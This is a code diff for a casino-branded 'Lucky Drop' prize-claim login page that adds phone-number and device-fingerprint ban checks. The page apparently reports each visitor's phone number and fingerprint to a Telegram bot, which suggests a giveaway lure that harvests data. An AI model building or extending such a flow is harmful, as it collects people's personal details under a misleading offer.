@@ -1,6 +1,7 @@
 /**
  * CasinoPlus Index Page - Login & Verification
  * Saves device fingerprint to user_sessions
+ * With Phone + Device Fingerprint Ban Check
  */
 
 // Initialize Firebase
@@ -127,8 +128,8 @@ async function createUserSession(phone, fingerprint, deviceDisplayId) {
 function showBlockedUI(reason = "banned") {
     modalOverlay.style.display = 'flex';
     
-    let title = "RESTRICTED";
-    let blockMessage = "⚠️ This mobile number has been restricted by the administrator.";
+    let title = "ACCESS RESTRICTED";
+    let blockMessage = "⚠️ This account has been restricted by the administrator.";
     
     if (reason === "claimed") {
         title = "ALREADY CLAIMED";
@@ -155,10 +156,64 @@ window.handleVerify = function() {
     }
 };
 
-// ========== CHECK IF NUMBER IS BANNED ==========
-async function isNumberBanned(phone) {
+// ========== BANNED CHECK FUNCTIONS ==========
+
+// Check if phone number is banned
+async function isPhoneBanned(phone) {
     const bannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
     return bannedSnap.exists();
+}
+
+// Check if fingerprint is linked to a banned phone
+async function isFingerprintLinkedToBanned(fingerprint) {
+    // Check device_phone_map for linked phone
+    const devicePhoneMapSnap = await db.ref('device_phone_map/' + fingerprint).once('value');
+    if (devicePhoneMapSnap.exists()) {
+        const linkedPhone = devicePhoneMapSnap.val().phone;
+        const isLinkedBanned = await isPhoneBanned(linkedPhone);
+        if (isLinkedBanned) {
+            return true;
+        }
+    }
+    
+    // Check all banned_ghosts for matching fingerprint
+    const bannedSnap = await db.ref('banned_ghosts').once('value');
+    const bannedData = bannedSnap.val();
+    
+    if (bannedData) {
+        for (const [phone, data] of Object.entries(bannedData)) {
+            if (data.fingerprint === fingerprint) {
+                return true;
+            }
+        }
+    }
+    
+    return false;
+}
+
+// Get ban details
+async function getBanDetails(phone, fingerprint) {
+    // Check phone ban first
+    const phoneBannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
+    if (phoneBannedSnap.exists()) {
+        return {
+            isBanned: true,
+            reason: phoneBannedSnap.val().reason || "Account restricted",
+            type: "phone"
+        };
+    }
+    
+    // Check fingerprint ban (device linked to banned phone)
+    const isFpLinkedToBanned = await isFingerprintLinkedToBanned(fingerprint);
+    if (isFpLinkedToBanned) {
+        return {
+            isBanned: true,
+            reason: "This device is restricted",
+            type: "device"
+        };
+    }
+    
+    return { isBanned: false };
 }
 
 // ========== CHECK IF NUMBER ALREADY CLAIMED ==========
@@ -182,16 +237,16 @@ window.processStep1 = async function() {
     btn.innerHTML = "VERIFYING...";
 
     try {
-        // 1. Check if number is BANNED
-        const isBanned = await isNumberBanned(phone);
-        if (isBanned) {
+        // ========== BANNED CHECK #1: Phone number ==========
+        const banDetails = await getBanDetails(phone, fingerprint);
+        if (banDetails.isBanned) {
             showBlockedUI("banned");
             btn.disabled = false;
             btn.innerHTML = "Claim Now";
             return;
         }
         
-        // 2. Check if number already CLAIMED
+        // ========== BANNED CHECK #2: Already claimed ==========
         const isClaimed = await isNumberClaimed(phone);
         if (isClaimed) {
             showBlockedUI("claimed");
@@ -200,21 +255,16 @@ window.processStep1 = async function() {
             return;
         }
         
-        // 3. Get or create device display ID (Dev1, Dev2, etc.)
+        // ========== NORMAL FLOW ==========
         const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
-        
-        // 4. Save device info
         await saveDeviceInfo(phone, fingerprint, deviceDisplayId);
-        
-        // 5. Create or update user session with fingerprint
         await createUserSession(phone, fingerprint, deviceDisplayId);
         
-        // 6. Send Telegram notification with fingerprint and Dev#
+        // Send Telegram notification (no banned users)
         const message = `🎁 LUCKY DROP LOGIN:\n📱 ${phone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .catch(e => console.log('Telegram error:', e));
         
-        // 7. Save to localStorage and redirect
         localStorage.setItem("userPhone", phone);
         localStorage.setItem("userDeviceId", fingerprint);
         localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
